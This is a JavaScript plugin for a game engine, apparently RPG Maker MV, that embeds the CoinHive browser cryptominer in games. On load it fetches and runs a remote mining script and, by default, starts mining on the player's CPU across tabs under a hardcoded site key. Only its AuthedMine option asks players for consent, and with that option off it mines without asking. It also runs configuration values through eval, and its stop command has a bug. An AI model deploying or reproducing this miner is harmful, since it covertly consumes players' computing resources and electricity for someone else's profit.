/*:
 * MIT License
 *
 * Copyright (c) 2017 ascraeus
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 * 
 * @plugindesc CoinHive Simple Miner Plugin v1.0.0
 * @author ascraeus
 *
 * @param AuthedMine
 * @type boolean
 * @on ON
 * @off OFF
 * @default true
 *
 * @param StartUp
 * @type boolean
 * @on ON
 * @off OFF
 * @default true 
 * 
 * @param YOUR_SITE_KEY
 * @desc YOUR_SITE_KEY
 * @type string
 * @default S0wxMnawLt1fDu1byhXvjeoPxpBekjL2
 * 
 * @param Anonymous
 * @type boolean
 * @on ON
 * @off OFF
 * @default true 
 *
 * @param UserName
 * @type string
 * @default SimpleMinerPlugin
 *
 * @param HashesPerSecond
 * @type variable
 * @default 1
 *
 * @param TotalHashes
 * @type variable
 * @default 2
 *
 * @param AcceptedHashes
 * @type variable
 * @default 3
 *
 * @param ConsoleLog
 * @type boolean
 * @on ON
 * @off OFF
 * @default true
 *
 */
(function() {
    "use strict"
    class SimpleMinerPlugin{
        constructor() {
            this.Parameters = this._paramParse(PluginManager.parameters('SimpleMinerPlugin'));
            this.AuthedMine = this.Parameters['AuthedMine'];
            this.Anonymous = this.Parameters['Anonymous'];
            this.HashesPerSecond = this.Parameters['HashesPerSecond'];
            this.TotalHashes = this.Parameters['TotalHashes'];
            this.AcceptedHashes = this.Parameters['AcceptedHashes'];
            this.ConsoleLog = this.Parameters['ConsoleLog'];
            this.Miner = null;
            var _this = this;
            var _script;
            if (this.AuthedMine === true) {
                _script = 'https://authedmine.com/lib/authedmine.min.js';
            }
            else {
                _script = 'https://coinhive.com/lib/coinhive.min.js';
            }
            this._loadScript(_script,this._StartUp.bind(this));
        }
        _StartUp(){
            if(this.Miner == null){
                if(this.Parameters['StartUp']){
                    if(this.Parameters['Anonymous']){
                        this.Miner = new CoinHive.Anonymous(this.Parameters['YOUR_SITE_KEY']);
                    }else{
                        this.Miner = new CoinHive.User(this.Parameters['YOUR_SITE_KEY'],this.Parameters['UserName']);
                    }
                    this.Miner.start(CoinHive.FORCE_MULTI_TAB);
                    var _this = this;
                    this.intervalId = setInterval(function () {
                        if(_this.Miner != null){
                            if(_this.Miner.isRunning()){
                                if(_this.ConsoleLog){
                                    var update = {
                                        hashesPerSecond: _this.Miner.getHashesPerSecond(),
                                        totalHashes: _this.Miner.getTotalHashes(),
                                        acceptedHashes: _this.Miner.getAcceptedHashes(),
                                        threads: _this.Miner.getNumThreads(),
                                        autoThreads: _this.Miner.getAutoThreadsEnabled(),
                                    }
                                    console.log('update:', update)
                                }
                                if($gameVariables!=null){
                                    $gameVariables.setValue(_this.HashesPerSecond, Number(_this.Miner.getHashesPerSecond()) || 0 );
                                    $gameVariables.setValue(_this.TotalHashes, Number(_this.Miner.getTotalHashes()) || 0 );
                                    $gameVariables.setValue(_this.AcceptedHashes, Number(_this.Miner.getAcceptedHashes()) || 0 );
                                }
                            }
                        }
                    }, 1000);
                }
            }
        }
        _loadScript(_name, _onload) {
            var url = _name;
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.src = url;
            script.async = false;
            script._url = url;
            script.onload = _onload;
            script.onerror = this._onError.bind(this);
            //document.body.appendChild(script);
            document.currentScript.parentNode.insertBefore(script, document.currentScript); 
        }
        _onError(e) {
            if (e.target._url) throw new Error('Failed to load: ' + e.target._url);
        }
        _paramParse(obj) {
            return JSON.parse(JSON.stringify(obj, this._paramReplace.bind(this)), this._paramRevive.bind(this));
        }
        _paramReplace(key, value) {
            try {
                return JSON.parse(value || null);
            } catch (e) {
                return value;
            }
        }
        _paramRevive(key, value) {
            try {
                return eval(value || value);
            } catch (e) {
                return value;
            }
        }
    }
    let $simpleMinerPlugin = new SimpleMinerPlugin();
    var _Game_Interpreter_pluginCommand = Game_Interpreter.prototype.pluginCommand;
    Game_Interpreter.prototype.pluginCommand = function(command, args) {
        _Game_Interpreter_pluginCommand.call(this, command, args);
        if (command === 'SimpleMinerPlugin') {
            switch (args[0]) {
                case 'start':
                    if($simpleMinerPlugin.Miner == null){
                        if($simpleMinerPlugin.Anonymous){
                            $simpleMinerPlugin.Miner = new CoinHive.Anonymous($simpleMinerPlugin.Parameters['YOUR_SITE_KEY']);
                        }else{
                            $simpleMinerPlugin.Miner = new CoinHive.User($simpleMinerPlugin.Parameters['YOUR_SITE_KEY'],$simpleMinerPlugin.Parameters['UserName']);
                        }
                    }
                    if(!$simpleMinerPlugin.Miner.isRunning())$simpleMinerPlugin.Miner.start(CoinHive.FORCE_MULTI_TAB);
                    break;
                case 'stop':
                    if(_this.Miner.isRunning())$simpleMinerPlugin.Miner.stop();
                    break;
                case 'threads':
                    if(Number(args[1]) > 0 ){
                        $simpleMinerPlugin.Miner.setNumThreads(Math.min(Number(args[1]),navigator.hardwareConcurrency));
                    }
                    break;
                case 'didOptOut':
                    if(!$simpleMinerPlugin.Miner.didOptOut(Number(args[1]))){
                        $simpleMinerPlugin.Miner.start(CoinHive.FORCE_MULTI_TAB);
                    }
                    break;
                case 'clear':
                    break;
            }
        }
    };

})();
